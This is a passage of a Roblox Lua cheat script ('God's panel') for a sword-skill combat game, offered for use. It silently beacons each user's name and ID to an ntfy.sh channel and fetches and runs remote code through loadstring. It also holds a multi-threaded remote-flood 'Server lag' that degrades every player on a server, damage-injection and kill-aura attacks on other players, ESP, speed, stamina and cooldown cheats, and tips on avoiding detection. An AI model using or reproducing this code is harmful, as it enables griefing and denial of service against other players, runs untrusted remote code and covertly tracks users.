local ReplicatedStorage=game:GetService("ReplicatedStorage")
local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local TeleportService=game:GetService("TeleportService")
local UserInputService=game:GetService("UserInputService")
local HttpService=game:GetService("HttpService")
local GuiService=game:GetService("GuiService")
local LocalPlayer=Players.LocalPlayer
local req=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
if req then task.spawn(function() pcall(function() req({Url="https://ntfy.sh/Decro_Admin_Panel_Users_2669200504_XYZ987",Method="POST",Body=LocalPlayer.Name.." ("..tostring(LocalPlayer.UserId)..")"}) end) end) end
local INVOKE_THREADS=50
local speedMultiplier=1
local currentTrueSpeed=16.80
local isModifyingSpeed=false
if getgenv().GodsPanelUnload then getgenv().GodsPanelUnload() end
local scriptUnloaded=false
getgenv().GodsPanelUnload=function() scriptUnloaded=true end
local rejoinOnKickEnabled=false
local noSunDamageEnabled=false
GuiService.ErrorMessageChanged:Connect(function() if rejoinOnKickEnabled and not scriptUnloaded then pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end) end end)
local scytheLowCD=false
local swampLowCD=false
local willLowCD=false
local warFanLowCD=false
local iceLowCD=false
local waterLowCD=false
local bloodLowCD=false
local reaperLowCD=false
local shockwaveLowCD=false
local dreamLowCD=false
local blockLowCD=false
local tamariLowCD=false
local arrowLowCD=false
local soundLowCD=false
local windLowCD=false
local mistLowCD=false
local thunderLowCD=false
local insectLowCD=false
local snowLowCD=false
local beastLowCD=false
local flameLowCD=false
local breathLowCD=false
local antiDrownEnabled=false
local infinityClimbEnabled=false
local infinityStaminaEnabled=false
local infinityBreathingEnabled=false
local originalCooldowns={}
local lowCDTogglesList={}
local allLowCDToggle=nil
local updatingToggles=false
local scytheSkills={Asteroid=true,Bloodlust=true}
local swampSkills={["Swamp Puddle"]=true,["Traveling Claws"]=true,["Swamp Eject"]=true,["Swamp Trap"]=true,["Self Replication"]=true,["Swamp Domain"]=true}
local willSkills={["Indomitable Will"]=true,["Spacial Awareness"]=true}
local warFanSkills={["War Tornado"]=true,["War Drums"]=true}
local iceSkills={["Bodhisattva"]=true,["Lotus Vines"]=true,["Freezing Cloud"]=true,["Barren Hanging Garden"]=true,["Cold White Prince"]=true,["Wintry Icicles"]=true}
local waterSkills={["Constant Flux"]=true,["Waterfall Basin"]=true,["Ripple Thrust"]=true,["Water Serpent"]=true,["Water Wheel"]=true,["Water Surface Slash"]=true}
local bloodSkills={["Blood Burst"]=true,["Explosive Blood"]=true,["Explosive Landmines"]=true,["Explosive Burst"]=true,["Explosive ChokeSlam"]=true,["Blood Shot"]=true}
local reaperSkills={["Speed Rush"]=true,["Quick Tackle"]=true,["Blazing Amputation"]=true,["Sonido"]=true,["Reap of Despair"]=true}
local shockwaveSkills={["Annihilation Type"]=true,["Flashing Willow"]=true,["Explosive Fury"]=true,["Crown Splitter"]=true,["Chaotic Type"]=true,["Air Type"]=true}
local dreamSkills={["Flesh Monster"]=true,["Spiritual Core"]=true,["Piercing Flesh"]=true,["Echoeing Whisper"]=true,["Melodic Whisper"]=true,["Hypnosis"]=true}
local blockSkills={["Block"]=true}
local tamariSkills={["Four Arms"]=true,["Power Kick"]=true,["Double Throw"]=true,["Normal Throw"]=true}
local arrowSkills={["Arrow Spikes"]=true,["Koketsu Arrow"]=true,["Piercing Arrow"]=true,["Arrow Flight"]=true,["Arrow Knockback"]=true}
local soundSkills={["String Performance"]=true,["Smoke Screen"]=true,["Explosive Impact"]=true,["Resounding Slashes"]=true,["Roar"]=true,["Bursting Bloom"]=true}
local windSkills={["Idaten Typhoon"]=true,["Cold Mountain Wind"]=true,["Black Wind Mountain Mist"]=true,["Clean Storm Wind Tree"]=true,["Dust Whirlwind Cutter"]=true,["Purifying Wind"]=true}
local mistSkills={["Obscuring Clouds"]=true,["Lunar Dispersing Mist"]=true,["Shifting Flow Flash"]=true,["Distant Haze"]=true,["Eight Layered Mist"]=true,["Cloud and Haze"]=true}
local thunderSkills={["Thunderclap and Flash: Sixfold"]=true,["Rice Spirit"]=true,["Rumbling Thunder"]=true,["Rapid Slashes"]=true,["Heat Lightning"]=true,["Thunder Clap"]=true}
local insectSkills={["Jaw Breaker"]=true,["True Flutter"]=true,["Compound Eye Hexagon"]=true,["Dance of The Centipede"]=true,["Mantis Kick"]=true,["Caprice"]=true}
local snowSkills={["Layered Frost"]=true,["Frost Path"]=true,["Frozen Desert"]=true,["Frostgnaw"]=true,["Illusory Storm"]=true,["Snowtide Vortex"]=true}
local beastSkills={["Pierce"]=true,["Crazy Cutting"]=true,["Bending Slash"]=true,["Throwing Strike"]=true,["Devouring Slash"]=true,["Devouring Rush"]=true}
local flameSkills={["Purgatory"]=true,["Flaming Tiger"]=true,["Blazing Universe"]=true,["Blooming Undulation"]=true,["Unknowing Fire"]=true,["Rising Scorching Sun"]=true}
local breathSkills={["Breathing"]=true,["Breath"]=true}
local origStamina,origStamBreath,origRemoveStam,origAddStam,origBreath=nil,nil,nil,nil,nil
local function setupSpeedHook(character)
local humanoid=character:WaitForChild("Humanoid",5)
if not humanoid then return end
humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
if isModifyingSpeed then return end
currentTrueSpeed=humanoid.WalkSpeed
if speedMultiplier~=1 then
isModifyingSpeed=true
humanoid.WalkSpeed=currentTrueSpeed*speedMultiplier
isModifyingSpeed=false
end end) end
task.spawn(function()
while not scriptUnloaded do
if noSunDamageEnabled then
local pValues=ReplicatedStorage:FindFirstChild("PlayerValues")
local myValues=pValues and pValues:FindFirstChild(LocalPlayer.Name)
if myValues and not myValues:FindFirstChild("No_Sun_Damage") then
local boolVal=Instance.new("BoolValue")
boolVal.Name="No_Sun_Damage"
boolVal.Value=true
boolVal.Parent=myValues
end end
task.wait(0.5) end end)
task.spawn(function()
while not scriptUnloaded do
if infinityStaminaEnabled or infinityBreathingEnabled then
pcall(function()
local pValues=ReplicatedStorage:FindFirstChild("PlayerValues")
if pValues then
local myValues=pValues:FindFirstChild(LocalPlayer.Name)
if myValues then
if infinityStaminaEnabled then
local stam=myValues:FindFirstChild("Stamina")
if stam and stam.Value<stam.MaxValue then stam.Value=stam.MaxValue end end
if infinityBreathingEnabled then
local breath=myValues:FindFirstChild("Breath")
if breath and breath.Value<breath.MaxValue then breath.Value=breath.MaxValue end end end end end) end
RunService.RenderStepped:Wait() end end)
task.spawn(function()
while not scriptUnloaded do
pcall(function()
local powerAdder=LocalPlayer.PlayerGui:FindFirstChild("Power_Adder")
if powerAdder then
for _,desc in ipairs(powerAdder:GetDescendants()) do
if desc.Name=="CoolDown" and desc:IsA("ValueBase") then
local skillName=desc.Parent.Name
local shouldReduce=false
if scytheSkills[skillName] and scytheLowCD then shouldReduce=true
elseif swampSkills[skillName] and swampLowCD then shouldReduce=true
elseif willSkills[skillName] and willLowCD then shouldReduce=true
elseif warFanSkills[skillName] and warFanLowCD then shouldReduce=true
elseif iceSkills[skillName] and iceLowCD then shouldReduce=true
elseif waterSkills[skillName] and waterLowCD then shouldReduce=true
elseif bloodSkills[skillName] and bloodLowCD then shouldReduce=true
elseif reaperSkills[skillName] and reaperLowCD then shouldReduce=true
elseif shockwaveSkills[skillName] and shockwaveLowCD then shouldReduce=true
elseif dreamSkills[skillName] and dreamLowCD then shouldReduce=true
elseif blockSkills[skillName] and blockLowCD then shouldReduce=true
elseif tamariSkills[skillName] and tamariLowCD then shouldReduce=true
elseif arrowSkills[skillName] and arrowLowCD then shouldReduce=true
elseif soundSkills[skillName] and soundLowCD then shouldReduce=true
elseif windSkills[skillName] and windLowCD then shouldReduce=true
elseif mistSkills[skillName] and mistLowCD then shouldReduce=true
elseif thunderSkills[skillName] and thunderLowCD then shouldReduce=true
elseif insectSkills[skillName] and insectLowCD then shouldReduce=true
elseif snowSkills[skillName] and snowLowCD then shouldReduce=true
elseif beastSkills[skillName] and beastLowCD then shouldReduce=true
elseif flameSkills[skillName] and flameLowCD then shouldReduce=true
elseif breathSkills[skillName] and breathLowCD then shouldReduce=true end
if shouldReduce then
if not originalCooldowns[desc] then originalCooldowns[desc]=desc.Value end
local factor = 0.6
local targetVal=originalCooldowns[desc]*factor
if desc.Value~=targetVal then desc.Value=targetVal end
else
if originalCooldowns[desc] then
if desc.Value~=originalCooldowns[desc] then desc.Value=originalCooldowns[desc] end
originalCooldowns[desc]=nil
end end end end end end)
task.wait(0.3) end end)
if LocalPlayer.Character then task.spawn(setupSpeedHook,LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(function(char) currentTrueSpeed=16.80 setupSpeedHook(char) end)
if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(5)
local combatRemote=ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S
local invokeRemote=nil
pcall(function() invokeRemote=ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S_ end)
local lanternHandlers={}
for _,name in pairs({"Lantern_Handler","Box_Lantern_Handler","Old_Lantern_Handler","Lantern_Of_Despair_Handler","Lantern_Of_Everlasting_Glow_Handler"}) do
pcall(function() local r=ReplicatedStorage.Remotes:FindFirstChild(name) if r then table.insert(lanternHandlers,r) end end) end
local lanternTools={}
for _,name in pairs({"Lantern","Box Lantern","Old Lantern","Lantern Of Despair","Lantern Of Everlasting Glow"}) do
pcall(function() local t=ReplicatedStorage.Tools:FindFirstChild(name) if t then table.insert(lanternTools,t) end end) end
local toolsData=nil
pcall(function() local pd=ReplicatedStorage.Player_Data:WaitForChild(LocalPlayer.Name,5) if pd then toolsData=pd:FindFirstChild("tools_thing123") end end)
local isActive=false
local function invokeFlood()
if not invokeRemote then return end
for i=1,INVOKE_THREADS do
task.spawn(function()
while isActive do
pcall(function() invokeRemote:InvokeServer("Change_Value",nil,true) end)
pcall(function() invokeRemote:InvokeServer("Change_Value",nil,false) end)
end end)
if i%10==0 then task.wait() end end end
local function lanternCycle()
task.spawn(function()
pcall(function()
while isActive do
for _,handler in pairs(lanternHandlers) do
for _,tool in pairs(lanternTools) do
pcall(function() handler:FireServer(2,tool) end)
pcall(function() handler:FireServer(1,tool) end) end end
RunService.RenderStepped:Wait() end end) end) end
local function changeValueFlood()
if not toolsData then return end
task.spawn(function()
pcall(function()
local vals=toolsData:GetChildren()
while isActive do
for _,v in pairs(vals) do
pcall(function() combatRemote:FireServer("Change_Value",v,true) end)
pcall(function() combatRemote:FireServer("Change_Value",v,false) end) end
RunService.RenderStepped:Wait() end end) end) end
local function fireCrash()
if isActive then return end
isActive=true
invokeFlood()
lanternCycle()
changeValueFlood() end
local loaded, Rayfield = pcall(function()
return loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
end)
if not loaded then warn("Rayfield failed: "..tostring(Rayfield)) return end
local ESP_GUI_NAME = "EvadeESP_Zinks"
local DODGE_VALUE_NAME = "dodgesasdasd"
local espEnabled = false
local espGeneration = 0
local espConnections = {}
local espPlayerConnections = {}
local espRecords = {}
local function disconnect(conn) if conn then pcall(conn.Disconnect, conn) end end
local function disconnectAll(t) for i=#t,1,-1 do disconnect(t[i]) t[i]=nil end end
local function removeStaleBillboards()
for _, child in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
if child:IsA("BillboardGui") and child.Name == ESP_GUI_NAME then child:Destroy() end
end
for _, p in ipairs(Players:GetPlayers()) do
local head = p.Character and p.Character:FindFirstChild("Head")
if head then
local bg = head:FindFirstChild(ESP_GUI_NAME)
if bg and bg:IsA("BillboardGui") then bg:Destroy() end
end
end
end
local function getFallbackDodgeCount(player)
local count = 2
local pdRoot = ReplicatedStorage:FindFirstChild("Player_Data")
local pd = pdRoot and pdRoot:FindFirstChild(player.Name)
local clan = pd and pd:FindFirstChild("Clan")
local modules = ReplicatedStorage:FindFirstChild("Modules")
local data = modules and modules:FindFirstChild("Data")
local clansMod = data and data:FindFirstChild("ClansData")
if clan and clansMod then
local suc, tbl = pcall(require, clansMod)
if suc and type(tbl)=="table" then
local stats = tbl.ClanStats
local cData = type(stats)=="table" and stats[clan.Value]
local boost = tonumber(cData and cData.Combo_Escape_boost) or 0
count = count + boost
end
end
if workspace:FindFirstChild("is_ouwigahara") then count = count + 9999 end
return count
end
local function destroyRecord(player, expectedRecord)
local rec = espRecords[player]
if not rec or (expectedRecord and rec ~= expectedRecord) then return end
rec.alive = false
disconnect(rec.headConnection)
disconnect(rec.dodgeConnection)
disconnectAll(rec.connections)
if rec.gui then rec.gui:Destroy() end
espRecords[player] = nil
end
local function updateRecordText(rec)
if not rec or not rec.alive or not rec.gui or not rec.label then return end
local valObj = rec.dodgeValue
if valObj and valObj.Parent == rec.character then
local suc, val = pcall(function() return valObj.Value end)
if suc then rec.label.Text = tostring(val) return end
end
rec.label.Text = tostring(getFallbackDodgeCount(rec.player))
end
local function bindDodgeValue(rec)
if not rec or not rec.alive then return end
local valObj = rec.character:FindFirstChild(DODGE_VALUE_NAME)
if valObj and not valObj:IsA("ValueBase") then valObj = nil end
if rec.dodgeValue ~= valObj then
disconnect(rec.dodgeConnection)
rec.dodgeConnection = valObj and valObj:GetPropertyChangedSignal("Value"):Connect(function() updateRecordText(rec) end) or nil
rec.dodgeValue = valObj
end
updateRecordText(rec)
end
local function attachBillboard(rec, head)
if not rec or not rec.alive or rec.gui or not head:IsA("BasePart") or head.Parent ~= rec.character then return end
disconnect(rec.headConnection)
rec.headConnection = nil
local billboard = Instance.new("BillboardGui")
billboard.Name = ESP_GUI_NAME
billboard.Adornee = head
billboard.AlwaysOnTop = false
billboard.LightInfluence = 0
billboard.MaxDistance = 100
billboard.Size = UDim2.fromOffset(92, 30)
billboard.StudsOffsetWorldSpace = Vector3.new(0, 3, 0)
billboard.Parent = LocalPlayer.PlayerGui
local label = Instance.new("TextLabel")
label.BackgroundTransparency = 1
label.Size = UDim2.fromScale(1,1)
label.Font = Enum.Font.GothamBold
label.TextColor3 = Color3.fromRGB(255,255,255)
label.TextStrokeColor3 = Color3.fromRGB(0,0,0)
label.TextStrokeTransparency = 0.2
label.TextScaled = true
label.Parent = billboard
rec.gui = billboard
rec.label = label
table.insert(rec.connections, rec.character.ChildAdded:Connect(function(c) if c.Name == DODGE_VALUE_NAME then bindDodgeValue(rec) end end))
table.insert(rec.connections, rec.character.ChildRemoved:Connect(function(c) if c.Name == DODGE_VALUE_NAME then bindDodgeValue(rec) end end))
bindDodgeValue(rec)
end
local function createRecord(player, character)
if player == LocalPlayer or not character then return end
destroyRecord(player)
if not espEnabled or scriptUnloaded then return end
local rec = {
player = player,
character = character,
generation = espGeneration,
alive = true,
connections = {},
headConnection = nil,
dodgeConnection = nil,
dodgeValue = nil,
gui = nil,
label = nil,
}
espRecords[player] = rec
table.insert(rec.connections, character.AncestryChanged:Connect(function(_, parent) if parent == nil then destroyRecord(player, rec) end end))
local head = character:FindFirstChild("Head")
if head and head:IsA("BasePart") then attachBillboard(rec, head) else rec.headConnection = character.ChildAdded:Connect(function(c) if c.Name=="Head" and c:IsA("BasePart") then attachBillboard(rec, c) end end) end
end
local function unwatchPlayer(player)
destroyRecord(player)
local conns = espPlayerConnections[player]
if conns then disconnectAll(conns); espPlayerConnections[player] = nil end
end
local function watchPlayer(player)
if player == LocalPlayer or espPlayerConnections[player] or not espEnabled or scriptUnloaded then return end
local conns = {}
espPlayerConnections[player] = conns
table.insert(conns, player.CharacterAdded:Connect(function(c) createRecord(player, c) end))
table.insert(conns, player.CharacterRemoving:Connect(function(c) destroyRecord(player, espRecords[player] and espRecords[player].character == c and espRecords[player] or nil) end))
if player.Character then createRecord(player, player.Character) end
end
local function stopESP()
for p in pairs(espPlayerConnections) do unwatchPlayer(p) end
for p in pairs(espRecords) do destroyRecord(p) end
disconnectAll(espConnections)
removeStaleBillboards()
end
local function setESPEnabled(value)
espGeneration = espGeneration + 1
espEnabled = false
stopESP()
if not value or scriptUnloaded then return end
espEnabled = true
table.insert(espConnections, Players.PlayerAdded:Connect(watchPlayer))
table.insert(espConnections, Players.PlayerRemoving:Connect(unwatchPlayer))
for _, p in ipairs(Players:GetPlayers()) do watchPlayer(p) end
end
local Window = Rayfield:CreateWindow({
Name = "God's panel.",
Icon = 0,
LoadingTitle = "Made by zdecro ( recursion )",
LoadingSubtitle = "Wait...",
ShowText = "GodPanel",
Theme = "Bloom",
ToggleUIKeybind = Enum.KeyCode.RightControl,
DisableRayfieldPrompts = false,
DisableBuildWarnings = false,
ConfigurationSaving = { Enabled = false, FileName = "GodsPanel" },
Discord = { Enabled = false, Invite = "noenv", RememberJoins = true },
KeySystem = false
})
local InfoTab = Window:CreateTab("Info", 0)
InfoTab:CreateSection("Info")
InfoTab:CreateParagraph({Title = "Description", Content = "\nThis script was created to simplify the gameplay, i dont promote hacking or cheating. The script was completely created by zdecro (recursion). I also want to thank zinks for a lot of ideas. Have a good game."})
local ServerTab = Window:CreateTab("Server", 0)
ServerTab:CreateSection("Server damage")
ServerTab:CreateButton({ Name = "Server lag", Callback = function() fireCrash() end })
ServerTab:CreateParagraph({Title = "Description", Content = "\nAfter clicking on it, a light bulb will appear in your hands and FPS will drop on everyone on the server. I advise you to hide, otherwise it will be seen that you are using this function. The closer you get to the other players, the more laggy they get. If you use this function for a long time, it will start to weaken, you need to restart and turn it on again. To turn it off, rejoin."})
ServerTab:CreateButton({
Name = "Server kill",
Callback = function()
game:GetService("ReplicatedStorage").Remotes.To_Server.Handle_Initiate_S:FireServer("skil_ting_asd",LocalPlayer,"thunderbreathingricespirit",5)
local args={[1]="ricespiritdamage",[2]=LocalPlayer.Character,[3]=CFrame.new(-362.2265930175781,425.482421875,-2354.545166015625,0.32892149686813354,0.024535520002245903,0.9440385103225708,1.0956046736509961e-07,0.999662458896637,-0.025981221348047256,-0.9443572759628296,0.008545885793864727,0.328810453414917),[4]=99999999999999999999999}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("To_Server"):WaitForChild("Handle_Initiate_S"):FireServer(unpack(args))
task.wait(1.5)
TeleportService:Teleport(game.PlaceId)
end,
})
ServerTab:CreateParagraph({Title = "Description", Content = "\nNOT WORKING!"})
ServerTab:CreateSection("Misc")
ServerTab:CreateButton({ Name = "Rejoin", Callback = function() local placeId=game.PlaceId local jobId=game.JobId if placeId and jobId and #jobId>0 then TeleportService:TeleportToPlaceInstance(placeId,jobId) end end })
ServerTab:CreateToggle({ Name = "Rejoin on kicks", CurrentValue = false, Flag = "RejoinOnKicks", Callback = function(v) rejoinOnKickEnabled=v end })
ServerTab:CreateSection("Kill all")
getgenv().selectedPlayerName = ""
getgenv().TargetPlayersArrow = false
getgenv().AllArrow = false
ServerTab:CreateInput({ Name = "Player target", PlaceholderText = "zdecro, RobloxServerTest_1, cardcheaf", RemoveTextAfterFocusLost = false, Callback = function(Text) getgenv().selectedPlayerName = Text end })
ServerTab:CreateParagraph({Title = "Description", Content = "\nThis is the arrow kill aura. You need an arrow."})
ServerTab:CreateToggle({ Name = "Arrow aura (target)", CurrentValue = false, Flag = "ArrowTarget", Callback = function(v) getgenv().TargetPlayersArrow = v end })
ServerTab:CreateParagraph({Title = "Description", Content = "\nOne or more players are attacking."})
ServerTab:CreateToggle({ Name = "Arrow aura (all)", CurrentValue = false, Flag = "ArrowAll", Callback = function(v) getgenv().AllArrow = v end })
ServerTab:CreateParagraph({Title = "Description", Content = "\nAll players are attacking."})
local LocalTab = Window:CreateTab("Local", 0)
LocalTab:CreateSection("Evade")
local StatusLabel = LocalTab:CreateLabel("Evade ESP: disabled")
LocalTab:CreateToggle({
Name = "Evade ESP",
CurrentValue = false,
Flag = "LocalEvadeESP",
Callback = function(value) setESPEnabled(value) StatusLabel:Set(value and "Evade ESP: enabled" or "Evade ESP: disabled") end,
})
LocalTab:CreateParagraph({Title = "Description", Content = "\nShows the evades of the opponents."})
LocalTab:CreateSection("Optimization")
LocalTab:CreateButton({
Name = "Boost FPS",
Callback = function()
if _G.__PSOptimizerConns then for _,c in ipairs(_G.__PSOptimizerConns) do c:Disconnect() end end
_G.__PSOptimizerConns={}
local disabledCount=0
local function checkInst(inst)
local cName=inst.ClassName
if cName=="ParticleEmitter" or cName=="Trail" or cName=="Beam" or cName=="Fire" or cName=="Smoke" or cName=="Sparkles" or cName=="Highlight" or cName=="PointLight" or cName=="SurfaceLight" or cName=="SpotLight" or cName=="BlurEffect" or cName=="ColorCorrectionEffect" or cName=="DepthOfFieldEffect" or cName=="SunRaysEffect" or cName=="BloomEffect" then inst.Enabled=false return 1
elseif cName=="Decal" or cName=="Texture" then inst.Transparency=1 return 1 end return 0
end
local function processInst(inst)
local s, res = pcall(checkInst, inst)
if s and res == 1 then disabledCount = disabledCount + 1 end
end
local function sweep(root) for _,desc in ipairs(root:GetDescendants()) do processInst(desc) end end
local function watch(container) table.insert(_G.__PSOptimizerConns,container.DescendantAdded:Connect(function(desc) task.defer(processInst,desc) end)) end
sweep(workspace) sweep(game:GetService("Lighting")) sweep(Players)
local sky=game:GetService("Lighting"):FindFirstChildOfClass("Sky") if sky then sky:Destroy() end
local clouds=game:GetService("Lighting"):FindFirstChildOfClass("Clouds") if clouds then clouds.Enabled=false end
watch(workspace) watch(game:GetService("Lighting")) watch(Players)
table.insert(_G.__PSOptimizerConns,Players.PlayerAdded:Connect(function(p) table.insert(_G.__PSOptimizerConns,p.CharacterAdded:Connect(function(c) sweep(c) end)) end))
if LocalPlayer and LocalPlayer.Character then sweep(LocalPlayer.Character) end
print(string.format("[Optimizer] Disabled %d instances.",disabledCount))
end,
})
LocalTab:CreateParagraph({Title = "Description", Content = "\nDisables some effects/parts. To turn it off rejoin."})
LocalTab:CreateSection("Walkspeed")
LocalTab:CreateSlider({
Name = "WalkSpeed Override", Range = {16, 200}, Increment = 1, Suffix = "Speed", CurrentValue = 16, Flag = "WalkSpeedSlider",
Callback = function(Value)
if Value==16 then speedMultiplier=1 else speedMultiplier=Value/16 end
local character=LocalPlayer.Character
local humanoid=character and character:FindFirstChildOfClass("Humanoid")
if humanoid then isModifyingSpeed=true humanoid.WalkSpeed=currentTrueSpeed*speedMultiplier isModifyingSpeed=false end
end,
})
LocalTab:CreateButton({
Name = "Reset WalkSpeed",
Callback = function()
speedMultiplier=1
local character=LocalPlayer.Character
local humanoid=character and character:FindFirstChildOfClass("Humanoid")
if humanoid then isModifyingSpeed=true humanoid.WalkSpeed=currentTrueSpeed isModifyingSpeed=false end
end,
})
LocalTab:CreateSection("BDA")
LocalTab:CreateButton({
Name = "Spin BDA",
Callback = function()
pcall(function() game:GetService("ReplicatedStorage").Remotes.To_Server.Handle_Initiate_S_:InvokeServer("check_can_spin_demon_art") end)
task.wait(0.1)
pcall(function()
local powerAdder=game.Players.LocalPlayer.PlayerGui:FindFirstChild("Power_Adder")
if powerAdder then
for _,child in ipairs(powerAdder:GetChildren()) do
if child.Name:lower():find("_bda") then
local remote=child:FindFirstChild("LocalScript") and child.LocalScript:FindFirstChild("RemoteEvent")
if remote then remote:FireServer(true) end
end
end
end
end)
end,
})
local SpinLabel = LocalTab:CreateLabel("Spins: 0")
task.spawn(function()
while not scriptUnloaded do
local rs=game:GetService("ReplicatedStorage")
local pd=rs:FindFirstChild("Player_Data")
local pv=rs:FindFirstChild("PlayerValues")
local pData=pd and pd:FindFirstChild(LocalPlayer.Name)
local pValues=pv and pv:FindFirstChild(LocalPlayer.Name)
local spinsVal=(pData and pData:FindFirstChild("Demon_art_Spins")) or (pValues and pValues:FindFirstChild("Demon_art_Spins"))
if spinsVal then SpinLabel:Set("Spins: " .. tostring(spinsVal.Value)) else SpinLabel:Set("Spins: 0") end
task.wait(0.5)
end
end)
LocalTab:CreateSection("Character")
LocalTab:CreateToggle({
Name = "No Sun Damage", CurrentValue = false, Flag = "NoSunDmg",
Callback = function(Value)
noSunDamageEnabled=(Value==true)
if not noSunDamageEnabled then
local pValues=ReplicatedStorage:FindFirstChild("PlayerValues")
local myValues=pValues and pValues:FindFirstChild(LocalPlayer.Name)
local target=myValues and myValues:FindFirstChild("No_Sun_Damage")
if target then target:Destroy() end
end
end,
})
LocalTab:CreateToggle({
Name = "Infinity Stamina", CurrentValue = false, Flag = "InfStamina",
Callback = function(Value)
local val=(Value==true)
if infinityStaminaEnabled==val then return end
infinityStaminaEnabled=val
if val then
origStamina=_G.Stamina origStamBreath=_G.StamBreath origRemoveStam=_G.RemoveStam origAddStam=_G.AddStamina
_G.Stamina=function() return true end _G.StamBreath=function() return true end _G.RemoveStam=function() end _G.AddStamina=function() end
else
if origStamina then _G.Stamina=origStamina end if origStamBreath then _G.StamBreath=origStamBreath end if origRemoveStam then _G.RemoveStam=origRemoveStam end if origAddStam then _G.AddStamina=origAddStam end
end
end,
})
LocalTab:CreateToggle({ Name = "Anti Drown", CurrentValue = false, Flag = "AntiDrown", Callback = function(Value) antiDrownEnabled=(Value==true) end })
LocalTab:CreateToggle({ Name = "Infinity climbing", CurrentValue = false, Flag = "InfClimbing", Callback = function(Value) infinityClimbEnabled=(Value==true) end })
LocalTab:CreateParagraph({Title = "Description", Content = "\nAllows endless climbing on all surfaces."})
LocalTab:CreateToggle({ Name = "Infinity War fans buff", CurrentValue = false, Flag = "InfWarFans", Callback = function(Value) getgenv().InfWarFans=Value end })
LocalTab:CreateToggle({
Name = "Infinity Breathing", CurrentValue = false, Flag = "InfBreathing",
Callback = function(Value)
local val=(Value==true)
if infinityBreathingEnabled==val then return end
infinityBreathingEnabled=val
if val then origBreath=_G.Breath _G.Breath=function() return false end else if origBreath then _G.Breath=origBreath end end
end,
})
LocalTab:CreateToggle({
Name = "Heart Ablaze", CurrentValue = false, Flag = "HeartAblaze",
Callback = function(Value)
pcall(function() game:GetService("ReplicatedStorage").Remotes.heart_ablaze_mode_remote:FireServer(Value) end)
end,
})
LocalTab:CreateButton({
Name = "Kill yourself",
Callback = function()
local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local character = player.Character
local root = character and character:FindFirstChild("HumanoidRootPart")
if root then
local speed = 190
local targetY = -300
local startPos = root.Position
local distance = math.abs(startPos.Y - targetY)
local timeToReach = distance / speed
root.Anchored = true
local targetCFrame = root.CFrame - Vector3.new(0, startPos.Y - targetY, 0)
local tweenInfo = TweenInfo.new(timeToReach, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
tween:Play()
tween.Completed:Connect(function()
if root then root.Anchored = false end
end)
end
end
})
LocalTab:CreateParagraph({Title = "Description", Content = "\nIt throws you down very quickly, and you die immediately from the height. I recommend hiding, as your fall under the map will be visible for the first half second."})
LocalTab:CreateSection("Cooldown")
LocalTab:CreateParagraph({Title = "Description", Content = "\nReduces cooldown time by 40%. When using skills quickly, it can kick. I recommend using it with auto rejoin."})
allLowCDToggle = LocalTab:CreateToggle({
Name = "Enable all low cooldowns", CurrentValue = false, Flag = "AllLowCD",
Callback = function(Value)
updatingToggles = true
for _, tog in ipairs(lowCDTogglesList) do tog:Set(Value) end
updatingToggles = false
end,
})
local function addCDToggle(name, flag, callback)
local tog = LocalTab:CreateToggle({
Name = name, CurrentValue = false, Flag = flag,
Callback = function(Value)
callback(Value)
if not updatingToggles and allLowCDToggle then
updatingToggles = true
local allEnabled = true
for _, t in ipairs(lowCDTogglesList) do if not t.CurrentValue then allEnabled = false break end end
allLowCDToggle:Set(allEnabled)
updatingToggles = false
end
end,
})
table.insert(lowCDTogglesList, tog)
return tog
end
addCDToggle("Flame low cooldown", "FlameCD", function(v) flameLowCD=v end)
addCDToggle("Breath low cooldown", "BreathCD", function(v) breathLowCD=v end)
addCDToggle("Scythe low CD", "ScytheCD", function(v) scytheLowCD=v end)
addCDToggle("Swamp low CD", "SwampCD", function(v) swampLowCD=v end)
addCDToggle("Hashibira will low CD", "WillCD", function(v) willLowCD=v end)
addCDToggle("War fans low CD", "WarFansCD", function(v) warFanLowCD=v end)
addCDToggle("Ice low CD", "IceCD", function(v) iceLowCD=v end)
addCDToggle("Water low CD", "WaterCD", function(v) waterLowCD=v end)
addCDToggle("Blood low cooldown", "BloodCD", function(v) bloodLowCD=v end)
addCDToggle("Reaper low cooldown", "ReaperCD", function(v) reaperLowCD=v end)
addCDToggle("Shockwave low cooldown", "ShockwaveCD", function(v) shockwaveLowCD=v end)
addCDToggle("Dream low cooldown", "DreamCD", function(v) dreamLowCD=v end)
addCDToggle("Block low cooldown", "BlockCD", function(v) blockLowCD=v end)
addCDToggle("Tamari low cooldown", "TamariCD", function(v) tamariLowCD=v end)
addCDToggle("Arrow low cooldown", "ArrowCD", function(v) arrowLowCD=v end)
addCDToggle("Sound low cooldown", "SoundCD", function(v) soundLowCD=v end)
addCDToggle("Wind low cooldown", "WindCD", function(v) windLowCD=v end)
addCDToggle("Mist low cooldown", "MistCD", function(v) mistLowCD=v end)
addCDToggle("Thunder low cooldown", "ThunderCD", function(v) thunderLowCD=v end)
addCDToggle("Insect low cooldown", "InsectCD", function(v) insectLowCD=v end)
addCDToggle("Snow low cooldown", "SnowCD", function(v) snowLowCD=v end)
addCDToggle("Beast low cooldown", "BeastCD", function(v) beastLowCD=v end)
local AnotherTab = Window:CreateTab("Another", 0)
AnotherTab:CreateSection("Frosties")
AnotherTab:CreateButton({ Name = "Launch", Callback = function() loadstring(game:HttpGet("https://getfrosties.com/Frosties.luau"))() end })
AnotherTab:CreateParagraph({Title = "Description", Content = "\nLaunches another exploit \"frosties\""})
AnotherTab:CreateSection("Auto-Block")
local autoBlockConns={}
AnotherTab:CreateToggle({
Name = "Auto-Block",
CurrentValue = false,
Callback = function(enabled)
if not enabled then
for _,c in ipairs(autoBlockConns) do c:Disconnect() end
autoBlockConns={} return
end
local vim=game:GetService("VirtualInputManager")
local player=Players.LocalPlayer
